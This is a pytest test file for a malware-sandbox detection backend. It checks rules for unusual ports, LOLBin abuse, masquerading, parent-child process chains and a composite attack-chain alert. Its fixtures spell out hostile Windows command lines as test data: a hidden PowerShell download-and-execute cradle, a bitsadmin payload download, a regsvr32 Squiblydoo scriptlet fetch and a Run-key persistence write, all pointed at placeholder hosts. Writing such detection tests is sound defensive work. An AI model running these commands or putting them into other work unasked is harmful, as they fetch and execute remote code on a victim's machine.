"""Tests for the smarter-detection wave — new rules and correlations.

Covers: the unusual-port rule, the expanded LOLBin/masquerading/parent-child
tables, the composite attack-chain correlation, and the global /alerts feed.
The session DB is shared, so every assertion is scoped to a unique run or
marker — never a global count.
"""

import datetime

from .conftest import make_run

_TS_BASE = datetime.datetime(2026, 8, 1, 12, 0, 0, tzinfo=datetime.timezone.utc)


def _ts(offset: int = 0) -> str:
    return (_TS_BASE + datetime.timedelta(seconds=offset)).isoformat()


def _ingest(client, run_id: str, events: list[dict]) -> None:
    resp = client.post("/ingest/batch", json=events)
    assert resp.status_code == 202, resp.text


def _alerts(client, run_id: str) -> list[dict]:
    return client.get(f"/runs/{run_id}/alerts").json()


def _proc(run_id: str, pid: int, ppid: int, name: str, cmd: str, ts: int) -> dict:
    return {
        "run_id": run_id, "platform": "windows", "event_type": "process_create",
        "timestamp": _ts(ts), "pid": pid, "ppid": ppid, "process_name": name,
        "command_line": cmd,
    }


def _net(run_id: str, ip: str, port: int, ts: int) -> dict:
    return {
        "run_id": run_id, "platform": "windows", "event_type": "network_connection",
        "timestamp": _ts(ts), "pid": 1, "dest_ip": ip, "dest_port": port, "protocol": "TCP",
    }


# ---------------------------------------------------------------------------
# Rule 8 — unusual-port
# ---------------------------------------------------------------------------

def test_unusual_port_fires_on_c2_style_port(client):
    run_id = make_run(client, sample_name="port-4444.bin")
    _ingest(client, run_id, [_net(run_id, "198.51.100.44", 4444, ts=1)])
    fired = [a for a in _alerts(client, run_id) if a["rule_id"] == "unusual-port"]
    assert len(fired) == 1
    assert "4444" in fired[0]["details"]


def test_unusual_port_ignores_common_ports(client):
    run_id = make_run(client, sample_name="port-common.bin")
    for i, port in enumerate((80, 443, 53, 22, 8080, 8443, 3389)):
        _ingest(client, run_id, [_net(run_id, "198.51.100.50", port, ts=i + 1)])
    fired = [a for a in _alerts(client, run_id) if a["rule_id"] == "unusual-port"]
    assert fired == []


# ---------------------------------------------------------------------------
# Expanded pattern tables
# ---------------------------------------------------------------------------

def test_lolbin_download_cradles_windows(client):
    run_id = make_run(client, sample_name="cradles.exe")
    _ingest(client, run_id, [
        _proc(run_id, 10, 1, "powershell.exe", "powershell.exe -ep bypass -w hidden IEX(New-Object Net.WebClient).DownloadString('http://x/')", ts=1),
        _proc(run_id, 11, 1, "bitsadmin.exe", "bitsadmin /transfer job http://x/p.exe C:\\p.exe", ts=2),
        _proc(run_id, 12, 1, "regsvr32.exe", "regsvr32 /s /u /i:http://x/x.sct scrobj.dll", ts=3),
    ])
    fired = [a for a in _alerts(client, run_id) if a["rule_id"] == "lolbin-abuse"]
    # Three distinct patterns fire three alerts (each with its own detail).
    assert len(fired) == 3
    details = " | ".join(a["details"] for a in fired)
    assert "download cradle" in details or "bypass" in details
    assert "bitsadmin" in details
    assert "Squiblydoo" in details


def test_masquerading_expanded_rundll32(client):
    run_id = make_run(client, sample_name="fake-rundll32.exe")
    _ingest(client, run_id, [
        _proc(run_id, 20, 4, "rundll32.exe", r"C:\Temp\rundll32.exe javascript:alert(1)", ts=1),
    ])
    fired = [a for a in _alerts(client, run_id) if a["rule_id"] == "masquerading"]
    assert len(fired) == 1
    assert "rundll32" in fired[0]["details"]


def test_parent_child_office_to_wscript(client):
    run_id = make_run(client, sample_name="office-wscript.bin")
    _ingest(client, run_id, [
        _proc(run_id, 30, 4, "winword.exe", r"C:\Program Files\...\WINWORD.EXE /q /n", ts=1),
        _proc(run_id, 31, 30, "wscript.exe", "wscript.exe evil.vbs", ts=2),
    ])
    fired = [a for a in _alerts(client, run_id) if a["rule_id"] == "suspicious-parent-child"]
    assert len(fired) == 1
    assert "wscript" in fired[0]["details"]


# ---------------------------------------------------------------------------
# Composite — coordinated attack chain
# ---------------------------------------------------------------------------

def test_attack_chain_fires_when_three_stages_reached(client):
    run_id = make_run(client, sample_name="chain-a.bin")
    _ingest(client, run_id, [
        _proc(run_id, 40, 4, "svchost.exe", r"C:\Temp\svchost.exe", ts=1),  # Defense Evasion
        _proc(run_id, 41, 4, "powershell.exe", "powershell.exe -enc SQBFAFgAAGgBdAA=", ts=2),  # Execution
        {
            "run_id": run_id, "platform": "windows", "event_type": "registry_write",
            "timestamp": _ts(3), "pid": 40,
            "registry_key": r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Updater",
        },  # Persistence
    ])
    fired = [a for a in _alerts(client, run_id) if a["rule_id"] == "attack-chain"]
    assert len(fired) == 1
    assert "3 distinct kill-chain stages" in fired[0]["details"]
    assert "Defense Evasion" in fired[0]["details"]
    assert "Persistence" in fired[0]["details"]


def test_attack_chain_fires_once_per_run(client):
    run_id = make_run(client, sample_name="chain-b.bin")
    _ingest(client, run_id, [
        _proc(run_id, 50, 4, "svchost.exe", r"C:\Temp\svchost.exe", ts=1),
        _proc(run_id, 51, 4, "powershell.exe", "powershell.exe -enc SQBFAFgAAGgBdAA=", ts=2),
        {
            "run_id": run_id, "platform": "windows", "event_type": "registry_write",
            "timestamp": _ts(3), "pid": 50,
            "registry_key": r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Updater",
        },
    ])
    assert len([a for a in _alerts(client, run_id) if a["rule_id"] == "attack-chain"]) == 1
    # A later batch (even one that adds a new stage) must not re-fire it.
    _ingest(client, run_id, [_net(run_id, "198.51.100.51", 4444, ts=4)])  # C2 stage
    assert len([a for a in _alerts(client, run_id) if a["rule_id"] == "attack-chain"]) == 1


def test_attack_chain_needs_three_stages(client):
    run_id = make_run(client, sample_name="chain-two.bin")
    _ingest(client, run_id, [
        _proc(run_id, 60, 4, "svchost.exe", r"C:\Temp\svchost.exe", ts=1),  # Defense Evasion
        _proc(run_id, 61, 4, "powershell.exe", "powershell.exe -enc SQBFAFgAAGgBdAA=", ts=2),  # Execution
    ])
    fired = [a for a in _alerts(client, run_id) if a["rule_id"] == "attack-chain"]
    assert fired == []


# ---------------------------------------------------------------------------
# Global /alerts feed (dashboard)
# ---------------------------------------------------------------------------

def test_global_alerts_feed_includes_newest_with_sample(client):
    marker = "feedalert-"
    run_id = make_run(client, sample_name=f"{marker}gen.bin")
    _ingest(client, run_id, [_proc(run_id, 70, 4, "powershell.exe", "powershell.exe -enc SQBFAFgAAGgBdAA=", ts=1)])

    resp = client.get("/alerts")
    assert resp.status_code == 200
    data = resp.json()
    assert isinstance(data, list) and data
    assert all("sample_name" in a for a in data)
    # The freshly-generated alert (unique sample) is in the global feed.
    assert any(a["sample_name"] == f"{marker}gen.bin" for a in data)


def test_global_alerts_feed_respects_limit(client):
    resp = client.get("/alerts", params={"limit": 3})
    assert resp.status_code == 200
    assert len(resp.json()) <= 3
